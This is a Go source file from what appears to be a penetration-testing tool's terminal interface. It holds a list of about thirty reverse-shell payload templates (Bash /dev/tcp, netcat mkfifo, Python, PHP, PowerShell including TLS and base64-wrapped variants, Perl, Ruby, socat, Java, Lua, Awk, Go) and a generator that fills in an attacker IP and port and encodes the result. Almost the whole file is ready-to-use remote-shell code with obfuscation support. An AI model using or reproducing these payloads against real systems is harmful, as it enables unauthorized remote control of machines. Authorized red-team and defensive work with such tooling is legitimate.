package tui

import (
	"encoding/base64"
	"encoding/binary"
	"strings"
	"unicode/utf16"
)

// encoding selects how the generated payload is emitted. It mirrors the
// "Encoding" dropdown in the web UI generator (none / url / base64).
type encoding int

const (
	encNone encoding = iota
	encURL
	encBase64
)

func (e encoding) String() string {
	switch e {
	case encURL:
		return "url"
	case encBase64:
		return "base64"
	default:
		return "none"
	}
}

// next cycles to the following encoding, wrapping back to none.
func (e encoding) next() encoding { return (e + 1) % 3 }

// shellEntry is one named reverse-shell payload template.
type shellEntry struct {
	name string
	tmpl string
}

// psB64Prefix marks PowerShell templates that are always emitted as UTF-16LE
// base64 wrapped in `powershell -e`, regardless of the selected encoding (the
// web UI behaves the same way).
const psB64Prefix = "PS_B64:"

// shellDB mirrors SHELL_DB in assets/js/src/catcher.js — keep the two in sync.
// Order is preserved so the TUI generator lists the same payloads, in the same
// order, as the web UI catcher's generator tab.
var shellDB = []shellEntry{
	// Bash
	{"Bash -i", "bash -i >& /dev/tcp/{IP}/{PORT} 0>&1"},
	{"Bash 196", "0<&196;exec 196<>/dev/tcp/{IP}/{PORT}; sh <&196 >&196 2>&196"},
	{"Bash read line", "exec 5<>/dev/tcp/{IP}/{PORT};cat <&5 | while read line; do $line 2>&5 >&5; done"},
	{"Bash udp", "sh -i >& /dev/udp/{IP}/{PORT} 0>&1"},
	// Netcat
	{"nc -e", "nc -e /bin/sh {IP} {PORT}"},
	{"nc.exe -e", "nc.exe -e cmd.exe {IP} {PORT}"},
	{"BusyBox nc -e", "busybox nc {IP} {PORT} -e sh"},
	{"nc -c", "nc -c sh {IP} {PORT}"},
	{"nc mkfifo", "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {IP} {PORT} >/tmp/f"},
	{"ncat -e", "ncat {IP} {PORT} -e /bin/sh"},
	{"ncat udp", "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|ncat -u {IP} {PORT} >/tmp/f"},
	// Python
	{"Python3 #1", `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`},
	{"Python3 #2", `python3 -c 'import socket,subprocess,os,pty;s=socket.socket();s.connect(("{IP}",{PORT}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'`},
	// PHP
	{"PHP exec", `php -r '$s=fsockopen("{IP}",{PORT});exec("/bin/sh -i <&3 >&3 2>&3");'`},
	{"PHP shell_exec", `php -r '$s=fsockopen("{IP}",{PORT});shell_exec("/bin/sh -i <&3 >&3 2>&3");'`},
	{"PHP passthru", `php -r '$s=fsockopen("{IP}",{PORT});passthru("/bin/sh -i <&3 >&3 2>&3");'`},
	// PowerShell
	{"PowerShell #1", "$LHOST = \"{IP}\"; $LPORT = {PORT}; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write(\"$Output`n\"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()"},
	{"PowerShell #2", "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{IP}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""},
	{"PowerShell #3 (Base64)", "PS_B64:$client = New-Object System.Net.Sockets.TCPClient('{IP}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"},
	{"PowerShell #4 (TLS)", "$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $TCPClient = New-Object Net.Sockets.TCPClient('{IP}', {port});$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$sslProtocols,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = New-Object System.Byte[] 4096 ;$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"},
	{"PowerShell #5 (Base64, stderr)", "PS_B64:$ErrorView=\"NormalView\";$ErrorActionPreference=\"Continue\";$c=New-Object System.Net.Sockets.TCPClient('{IP}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne0){$d=([text.encoding]::ASCII).GetString($b,0,$i);try{$o=iex $d 2>&1 3>&1 4>&1 5>&1 6>&1|Out-String}catch{$o=$_|Out-String}if([string]::IsNullOrEmpty($o)){$o=\"\"}$p=\"PS \"+(pwd).Path+\"> \";[byte[]]$sb=([text.encoding]::ASCII).GetBytes($o+$p);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"},
	// Other
	{"Perl", `perl -e 'use Socket;$i="{IP}";$p={PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`},
	{"Ruby", `ruby -rsocket -e'f=TCPSocket.open("{IP}",{PORT}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`},
	{"Socat #1", "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{IP}:{PORT}"},
	{"Java #1", `Runtime rt = Runtime.getRuntime();String[] cmd = {"/bin/bash","-c","bash -i >& /dev/tcp/{IP}/{PORT} 0>&1"};rt.exec(cmd);`},
	{"Lua", `lua -e 'require("socket");require("os");t=socket.tcp();t:connect("{IP}","{PORT}");os.execute("/bin/sh -i <&3 >&3 2>&3");'`},
	{"Awk", `awk 'BEGIN{s="/inet/tcp/0/{IP}/{PORT}";while(1){do{printf"$ "|&s;s|&getline c;if(c){while((c|&getline)>0)print$0|&s;close(c)}}while(c!="exit")}}'`},
	{"node.js", "require('child_process').exec('/bin/sh -i <&3 >&3 2>&3')"},
	{"Golang", "package main\nimport(\n\"os/exec\"\n\"net\"\n)\nfunc main(){\nc:=exec.Command(\"/bin/sh\")\nn,_:=net.Dial(\"tcp\",\"{IP}:{PORT}\")\nc.Stdin=n;c.Stdout=n;c.Stderr=n;c.Run()\n}"},
}

// generateCommand fills a shell template with ip/port and applies the chosen
// output encoding, mirroring updateGeneratorOutput() in
// assets/js/src/catcher.js. Templates prefixed with psB64Prefix are always
// emitted as UTF-16LE base64 wrapped in `powershell -e`, ignoring enc.
func generateCommand(tmpl, ip, port string, enc encoding) string {
	cmd := tmpl
	isPSB64 := strings.HasPrefix(cmd, psB64Prefix)
	if isPSB64 {
		cmd = cmd[len(psB64Prefix):]
	}
	// Both upper- and lower-case placeholders appear across the templates.
	cmd = strings.NewReplacer(
		"{IP}", ip, "{ip}", ip,
		"{PORT}", port, "{port}", port,
	).Replace(cmd)

	if isPSB64 {
		return "powershell -e " + base64.StdEncoding.EncodeToString(utf16LE(cmd))
	}
	switch enc {
	case encURL:
		return encodeURIComponent(cmd)
	case encBase64:
		return base64.StdEncoding.EncodeToString([]byte(cmd))
	}
	return cmd
}

// utf16LE encodes s as little-endian UTF-16, the byte layout PowerShell's
// -EncodedCommand expects before base64.
func utf16LE(s string) []byte {
	u := utf16.Encode([]rune(s))
	b := make([]byte, len(u)*2)
	for i, v := range u {
		binary.LittleEndian.PutUint16(b[i*2:], v)
	}
	return b
}

// encodeURIComponent reproduces JavaScript's encodeURIComponent so url-encoded
// output matches the web UI byte for byte: every byte is percent-encoded except
// the unreserved set A-Za-z0-9 and -_.!~*'() , and spaces become %20 (not +).
func encodeURIComponent(s string) string {
	const unreserved = "-_.!~*'()"
	var b strings.Builder
	for _, c := range []byte(s) {
		switch {
		case c >= 'A' && c <= 'Z', c >= 'a' && c <= 'z', c >= '0' && c <= '9',
			strings.IndexByte(unreserved, c) >= 0:
			b.WriteByte(c)
		default:
			const hex = "0123456789ABCDEF"
			b.WriteByte('%')
			b.WriteByte(hex[c>>4])
			b.WriteByte(hex[c&0xf])
		}
	}
	return b.String()
}
